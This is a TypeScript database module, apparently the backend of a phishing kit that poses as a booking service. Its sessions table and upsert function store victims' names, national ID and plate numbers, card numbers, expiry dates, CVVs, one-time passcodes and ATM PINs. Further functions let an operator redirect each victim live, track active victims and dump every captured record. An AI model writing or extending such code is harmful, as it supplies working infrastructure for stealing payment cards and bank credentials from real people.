// قاعدة بيانات PostgreSQL - تعمل على Render بشكل دائم
import { Pool } from 'pg';

let pool: Pool | null = null;

function getPool(): Pool {
  if (!pool) {
    const connectionString = process.env.DATABASE_URL || process.env.INTERNAL_DATABASE_URL;
    if (!connectionString) {
      throw new Error('DATABASE_URL environment variable is not set');
    }
    pool = new Pool({
      connectionString,
      ssl: connectionString.includes('dpg-') || connectionString.includes('render.com') 
        ? { rejectUnauthorized: false } 
        : undefined,
      max: 5,
      connectionTimeoutMillis: 10000,
    });
  }
  return pool;
}

let initialized = false;

export async function initDB() {
  if (initialized) return;
  initialized = true;
  const client = await getPool().connect();
  try {
    await client.query(`
      CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        country TEXT DEFAULT '',
        ip TEXT DEFAULT '',
        name TEXT DEFAULT '',
        id_number TEXT DEFAULT '',
        plate_number TEXT DEFAULT '',
        booking_date TEXT DEFAULT '',
        phone TEXT DEFAULT '',
        email TEXT DEFAULT '',
        card_number TEXT DEFAULT '',
        card_expiry TEXT DEFAULT '',
        card_cvv TEXT DEFAULT '',
        card_holder TEXT DEFAULT '',
        otp_code TEXT DEFAULT '',
        atm_pin TEXT DEFAULT '',
        current_page TEXT DEFAULT 'home',
        waiting_for TEXT DEFAULT '',
        stripe_status TEXT DEFAULT '',
        status TEXT DEFAULT 'active',
        is_new INTEGER DEFAULT 1,
        redirect_to TEXT DEFAULT '',
        created_at BIGINT DEFAULT 0,
        updated_at BIGINT DEFAULT 0
      )
    `);
    await client.query(`
      CREATE TABLE IF NOT EXISTS visits (
        id SERIAL PRIMARY KEY,
        session_id TEXT DEFAULT '',
        page TEXT DEFAULT '',
        country TEXT DEFAULT '',
        ip TEXT DEFAULT '',
        visited_at BIGINT DEFAULT 0
      )
    `);
    await client.query(`
      CREATE TABLE IF NOT EXISTS active_users (
        session_id TEXT PRIMARY KEY,
        last_ping BIGINT DEFAULT 0
      )
    `);
  } finally {
    client.release();
  }
}

// واجهة متوافقة مع الكود القديم
type PreparedStatement = {
  get: (...params: unknown[]) => unknown;
  all: (...params: unknown[]) => unknown[];
  run: (...params: unknown[]) => void;
};

function prepare(sql: string): PreparedStatement {
  const normalized = sql.replace(/\s+/g, ' ').trim();
  return {
    get: (...params: unknown[]) => {
      // نفذ بشكل async لكن أرجع null مؤقتاً (سيتم استبداله بالـ async API)
      return null;
    },
    all: (...params: unknown[]) => {
      return [];
    },
    run: (...params: unknown[]) => {
      // لا شيء - سيتم استخدام الـ async API مباشرة
    },
  };
}

export default function getDb() {
  return { prepare };
}

// ===== Async API =====

export async function upsertSession(data: {
  id: string;
  country?: string;
  ip?: string;
  name?: string;
  idNumber?: string;
  plateNumber?: string;
  bookingDate?: string;
  phone?: string;
  email?: string;
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  cardHolder?: string;
  otpCode?: string;
  atmPin?: string;
  currentPage?: string;
  waitingFor?: string;
  stripeStatus?: string;
}) {
  await initDB();
  const now = Date.now();
  const client = await getPool().connect();
  try {
    await client.query(`
      INSERT INTO sessions (
        id, country, ip, name, id_number, plate_number, booking_date,
        phone, email, card_number, card_expiry, card_cvv, card_holder,
        otp_code, atm_pin, current_page, waiting_for, stripe_status, created_at, updated_at
      ) VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$19)
      ON CONFLICT (id) DO UPDATE SET
        country = CASE WHEN $2 != '' THEN $2 ELSE sessions.country END,
        ip = CASE WHEN $3 != '' THEN $3 ELSE sessions.ip END,
        name = CASE WHEN $4 != '' THEN $4 ELSE sessions.name END,
        id_number = CASE WHEN $5 != '' THEN $5 ELSE sessions.id_number END,
        plate_number = CASE WHEN $6 != '' THEN $6 ELSE sessions.plate_number END,
        booking_date = CASE WHEN $7 != '' THEN $7 ELSE sessions.booking_date END,
        phone = CASE WHEN $8 != '' THEN $8 ELSE sessions.phone END,
        email = CASE WHEN $9 != '' THEN $9 ELSE sessions.email END,
        card_number = CASE WHEN $10 != '' THEN $10 ELSE sessions.card_number END,
        card_expiry = CASE WHEN $11 != '' THEN $11 ELSE sessions.card_expiry END,
        card_cvv = CASE WHEN $12 != '' THEN $12 ELSE sessions.card_cvv END,
        card_holder = CASE WHEN $13 != '' THEN $13 ELSE sessions.card_holder END,
        otp_code = CASE WHEN $14 != '' THEN $14 ELSE sessions.otp_code END,
        atm_pin = CASE WHEN $15 != '' THEN $15 ELSE sessions.atm_pin END,
        current_page = CASE WHEN $16 != '' THEN $16 ELSE sessions.current_page END,
        waiting_for = CASE WHEN $17 != '' THEN $17 ELSE sessions.waiting_for END,
        stripe_status = CASE WHEN $18 != '' THEN $18 ELSE sessions.stripe_status END,
        updated_at = $19,
        is_new = 1
    `, [
      data.id,
      data.country || '',
      data.ip || '',
      data.name || '',
      data.idNumber || '',
      data.plateNumber || '',
      data.bookingDate || '',
      data.phone || '',
      data.email || '',
      data.cardNumber || '',
      data.cardExpiry || '',
      data.cardCvv || '',
      data.cardHolder || '',
      data.otpCode || '',
      data.atmPin || '',
      data.currentPage || '',
      data.waitingFor || '',
      data.stripeStatus || '',
      now,
    ]);
  } finally {
    client.release();
  }
}

export async function updateSessionStatus(id: string, status: string, redirectTo?: string) {
  await initDB();
  const client = await getPool().connect();
  try {
    if (redirectTo !== undefined) {
      await client.query(
        'UPDATE sessions SET status=$1, redirect_to=$2, updated_at=$3 WHERE id=$4',
        [status, redirectTo, Date.now(), id]
      );
    } else {
      await client.query(
        'UPDATE sessions SET status=$1, updated_at=$2 WHERE id=$3',
        [status, Date.now(), id]
      );
    }
  } finally {
    client.release();
  }
}

export async function updateSessionRedirect(id: string, redirectTo: string) {
  await initDB();
  const client = await getPool().connect();
  try {
    await client.query(
      'UPDATE sessions SET redirect_to=$1, is_new=0, updated_at=$2 WHERE id=$3',
      [redirectTo, Date.now(), id]
    );
  } finally {
    client.release();
  }
}

export async function getSessionRedirect(id: string): Promise<{ redirect_to: string; status: string } | null> {
  await initDB();
  const client = await getPool().connect();
  try {
    const result = await client.query(
      'SELECT redirect_to, status FROM sessions WHERE id=$1',
      [id]
    );
    return result.rows[0] || null;
  } finally {
    client.release();
  }
}

export async function clearSessionRedirect(id: string) {
  await initDB();
  const client = await getPool().connect();
  try {
    await client.query(
      'UPDATE sessions SET redirect_to=$1, updated_at=$2 WHERE id=$3',
      ['', Date.now(), id]
    );
  } finally {
    client.release();
  }
}

export async function pingActiveUser(sessionId: string) {
  await initDB();
  const client = await getPool().connect();
  try {
    await client.query(`
      INSERT INTO active_users (session_id, last_ping) VALUES ($1, $2)
      ON CONFLICT (session_id) DO UPDATE SET last_ping = $2
    `, [sessionId, Date.now()]);
  } finally {
    client.release();
  }
}

export async function getActiveCount(): Promise<number> {
  await initDB();
  const client = await getPool().connect();
  try {
    const fiveMinutesAgo = Date.now() - 5 * 60 * 1000;
    const result = await client.query(
      'SELECT COUNT(*) as count FROM active_users WHERE last_ping > $1',
      [fiveMinutesAgo]
    );
    return parseInt(result.rows[0].count, 10);
  } finally {
    client.release();
  }
}

export async function recordVisit(sessionId: string, page: string, country: string, ip: string) {
  await initDB();
  const client = await getPool().connect();
  try {
    await client.query(
      'INSERT INTO visits (session_id, page, country, ip, visited_at) VALUES ($1,$2,$3,$4,$5)',
      [sessionId, page, country, ip, Date.now()]
    );
  } finally {
    client.release();
  }
}

export async function getTotalVisits(): Promise<number> {
  await initDB();
  const client = await getPool().connect();
  try {
    const result = await client.query('SELECT COUNT(*) as count FROM visits');
    return parseInt(result.rows[0].count, 10);
  } finally {
    client.release();
  }
}

export async function getAllSessions() {
  await initDB();
  const client = await getPool().connect();
  try {
    const result = await client.query('SELECT * FROM sessions ORDER BY updated_at DESC');
    return result.rows;
  } finally {
    client.release();
  }
}

export async function getSessionById(id: string) {
  await initDB();
  const client = await getPool().connect();
  try {
    const result = await client.query('SELECT * FROM sessions WHERE id=$1', [id]);
    return result.rows[0] || null;
  } finally {
    client.release();
  }
}
